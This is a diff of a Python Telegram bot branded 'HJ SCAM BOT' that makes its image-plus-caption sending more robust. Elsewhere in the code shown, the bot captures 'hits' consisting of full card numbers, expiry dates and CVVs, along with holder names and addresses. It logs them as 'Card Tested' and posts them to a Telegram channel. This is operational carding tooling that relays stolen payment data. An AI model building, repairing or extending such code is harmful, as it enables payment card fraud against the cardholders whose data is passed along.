@@ -26,19 +26,81 @@ bot = telebot.TeleBot(TokenAthena, parse_mode="html")
 system("clear")
 
 # ─── Imagen para enviar con los hits ──────────────────────────────────────────
-# Usa la imagen nueva descargada. Si no existe, fallback a hj.jpg o URL
 SCRIPT_DIR = path.dirname(path.abspath(__file__))
 IMAGE_PATH = path.join(SCRIPT_DIR, "nueva_img.jpg")
 IMAGE_FALLBACK = path.join(SCRIPT_DIR, "hj.jpg")
 IMAGE_URL = "https://i.ibb.co/9zznM39/IMG-20260607-101547-310.jpg"
 
-def get_image():
-    """Retorna la ruta de imagen disponible, o URL como último recurso."""
-    if path.isfile(IMAGE_PATH):
-        return IMAGE_PATH
-    if path.isfile(IMAGE_FALLBACK):
-        return IMAGE_FALLBACK
-    return IMAGE_URL
+
+def ensure_image():
+    """Descarga la imagen con requests si no existe o está corrupta. Retorna la ruta local o None."""
+    # Verificar imagen principal
+    for img_path in [IMAGE_PATH, IMAGE_FALLBACK]:
+        if path.isfile(img_path) and path.getsize(img_path) > 500:
+            print(f"{Fore.GREEN}[✓] Imagen lista: {img_path} ({path.getsize(img_path)} bytes){Fore.RESET}")
+            return img_path
+
+    # Descargar con requests (más confiable que curl)
+    print(f"{Fore.YELLOW}[!] Descargando imagen desde URL...{Fore.RESET}")
+    try:
+        resp = requests.get(IMAGE_URL, timeout=20)
+        if resp.status_code == 200 and len(resp.content) > 500:
+            with open(IMAGE_PATH, 'wb') as f:
+                f.write(resp.content)
+            print(f"{Fore.GREEN}[✓] Imagen descargada ({len(resp.content)} bytes){Fore.RESET}")
+            return IMAGE_PATH
+        else:
+            print(f"{Fore.RED}[✗] Respuesta inválida: status={resp.status_code}, size={len(resp.content)}{Fore.RESET}")
+    except Exception as e:
+        print(f"{Fore.RED}[✗] Error descargando imagen: {e}{Fore.RESET}")
+
+    return None
+
+
+def send_hit_photo(chat_id, caption_text):
+    """Envía foto+caption al canal con múltiples métodos de fallback."""
+    img_local = ensure_image()
+
+    # ── Método 1: Archivo local abierto con open('rb') ──
+    # Este es el método más confiable con pyTelegramBotAPI
+    if img_local and path.isfile(img_local):
+        try:
+            with open(img_local, 'rb') as photo_file:
+                bot.send_photo(chat_id, photo_file, caption=caption_text)
+            print(f"{Fore.GREEN}[✓] Foto enviada (método: archivo local){Fore.RESET}")
+            return True
+        except Exception as e:
+            print(f"{Fore.YELLOW}[!] Error archivo local: {e}{Fore.RESET}")
+
+    # ── Método 2: URL directa ──
+    try:
+        bot.send_photo(chat_id, IMAGE_URL, caption=caption_text)
+        print(f"{Fore.GREEN}[✓] Foto enviada (método: URL){Fore.RESET}")
+        return True
+    except Exception as e:
+        print(f"{Fore.YELLOW}[!] Error con URL: {e}{Fore.RESET}")
+
+    # ── Método 3: Enviar foto sin caption, luego texto separado ──
+    if img_local and path.isfile(img_local):
+        try:
+            with open(img_local, 'rb') as photo_file:
+                bot.send_photo(chat_id, photo_file)
+            bot.send_message(chat_id, caption_text)
+            print(f"{Fore.GREEN}[✓] Foto+texto enviados por separado{Fore.RESET}")
+            return True
+        except Exception as e:
+            print(f"{Fore.YELLOW}[!] Error foto separada: {e}{Fore.RESET}")
+
+    # ── Último recurso: solo texto ──
+    try:
+        bot.send_message(chat_id, caption_text)
+        print(f"{Fore.YELLOW}[!] Solo texto enviado (sin imagen){Fore.RESET}")
+        return True
+    except Exception as e:
+        print(f"{Fore.RED}[✗] Error enviando mensaje: {e}{Fore.RESET}")
+
+    return False
+
 
 # ─── Verificar tarjeta duplicada ──────────────────────────────────────────────
 
@@ -90,17 +152,10 @@ def cmd_update(message):
                 timeout=60
             )
 
-        # Descargar imagen si no existe
-        if not path.isfile(IMAGE_PATH):
-            try:
-                subprocess.run(
-                    ["curl", "-L", "-o", IMAGE_PATH, IMAGE_URL],
-                    capture_output=True, timeout=30
-                )
-            except:
-                pass
+        # Descargar imagen si no existe o está corrupta
+        ensure_image()
 
-        bot.reply_to(message, 
+        bot.reply_to(message,
             "✅ <b>Actualización descargada correctamente.</b>\n\n"
             "🔄 Reiniciando bot en 3 segundos...\n\n"
             f"<code>{output[:500]}</code>"
@@ -135,7 +190,7 @@ def cmd_status(message):
     except:
         commit_msg = "No disponible"
 
-    img_status = "✅ nueva_img.jpg" if path.isfile(IMAGE_PATH) else "⚠️ Fallback"
+    img_status = "✅ nueva_img.jpg" if path.isfile(IMAGE_PATH) and path.getsize(IMAGE_PATH) > 500 else "⚠️ Fallback"
 
     bot.reply_to(message,
         f"📊 <b>Estado del Bot</b>\n\n"
@@ -157,6 +212,24 @@ def cmd_restart(message):
     bot.reply_to(message, "🔄 <b>Reiniciando bot...</b>")
     subprocess.Popen(["bash", "-c", "sleep 2 && cd {} && python3 main.py".format(SCRIPT_DIR)])
     os._exit(0)
+
+# ─── Comando /testimg — Probar envío de imagen ────────────────────────────────
+
+@bot.message_handler(commands=['testimg'])
+def cmd_testimg(message):
+    """Envía una imagen de prueba al canal para verificar que funciona."""
+    user_id = message.from_user.id
+    if user_id != OWNER_ID:
+        return
+
+    bot.reply_to(message, "📸 <b>Enviando imagen de prueba al canal...</b>")
+    test_caption = "<b><i>TEST IMAGE</i></b>\n✅ Si ves imagen + este texto, funciona perfecto."
+
+    ok = send_hit_photo(id_channel_athena, test_caption)
+    if ok:
+        bot.reply_to(message, "✅ <b>Imagen enviada al canal.</b> Verificá el canal.")
+    else:
+        bot.reply_to(message, "❌ <b>No se pudo enviar la imagen.</b> Revisá los logs en la VPS.")
 
 # ─── Worker: Escuchar mensajes y capturar hits ────────────────────────────────
 
@@ -247,9 +320,7 @@ async def my_event_handler(event):
     except:
         name, lastname, street, complement = "Name", "Last", "Street", "123"
 
-    # ── Construir mensaje con imagen + texto ──
-    img = get_image()
-
+    # ── Construir mensaje ──
     new2 = f"""<b><i>HJ SCAM</i> #BIN{bin_num}</b>
 <b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
 <b>Cc</b> ➸ <code>{cc}|{mm}|{yy}|{cvv}</code>
@@ -266,37 +337,26 @@ async def my_event_handler(event):
     print(f"\n ✅ {Fore.LIGHTWHITE_EX}#Card Tested: {Fore.LIGHTBLUE_EX}{cc}|{mm}|{yy}|{cvv} {Fore.LIGHTWHITE_EX}/ {country}|{flag}\n"
           f"  {Fore.LIGHTWHITE_EX}#Successfully Sended - ID Channel: {Fore.LIGHTBLUE_EX}{id_channel_athena}")
 
-    try:
-        bot.send_photo(id_channel_athena, img, new2)
-    except Exception as e:
-        print(f"{Fore.RED}Error al enviar foto: {e}{Fore.RESET}")
-        try:
-            bot.send_message(id_channel_athena, new2)
-        except Exception as e2:
-            print(f"{Fore.RED}Error al enviar mensaje: {e2}{Fore.RESET}")
+    # Enviar foto + caption
+    send_hit_photo(id_channel_athena, new2)
 
 
 # ─── Iniciar ──────────────────────────────────────────────────────────────────
 
 print(f"""
 {Fore.RED}╔══════════════════════════════════════════╗
-{Fore.RED}║         {Fore.WHITE}HJ SCAM BOT - v2.0{Fore.RED}            ║
+{Fore.RED}║         {Fore.WHITE}HJ SCAM BOT - v3.0{Fore.RED}            ║
 {Fore.RED}╠══════════════════════════════════════════╣
-{Fore.RED}║  {Fore.WHITE}📸 Imagen + Texto automático{Fore.RED}        ║
+{Fore.RED}║  {Fore.WHITE}📸 Imagen + Texto (robusto){Fore.RED}          ║
 {Fore.RED}║  {Fore.WHITE}🔄 /update - Actualizar desde TG{Fore.RED}     ║
 {Fore.RED}║  {Fore.WHITE}📊 /status - Ver estado del bot{Fore.RED}     ║
 {Fore.RED}║  {Fore.WHITE}🔁 /restart - Reiniciar bot{Fore.RED}         ║
+{Fore.RED}║  {Fore.WHITE}🖼 /testimg - Probar imagen{Fore.RED}         ║
 {Fore.RED}╚══════════════════════════════════════════╝{Fore.RESET}
 """)
 
-# Descargar imagen si no existe
-if not path.isfile(IMAGE_PATH):
-    print(f"{Fore.YELLOW}[!] Descargando imagen nueva...{Fore.RESET}")
-    try:
-        subprocess.run(["curl", "-L", "-o", IMAGE_PATH, IMAGE_URL], timeout=30)
-        print(f"{Fore.GREEN}[✓] Imagen descargada{Fore.RESET}")
-    except:
-        print(f"{Fore.YELLOW}[!] No se pudo descargar, usando fallback{Fore.RESET}")
+# Asegurar que la imagen existe al iniciar
+ensure_image()
 
 # Iniciar bot de comandos en thread separado
 import threading
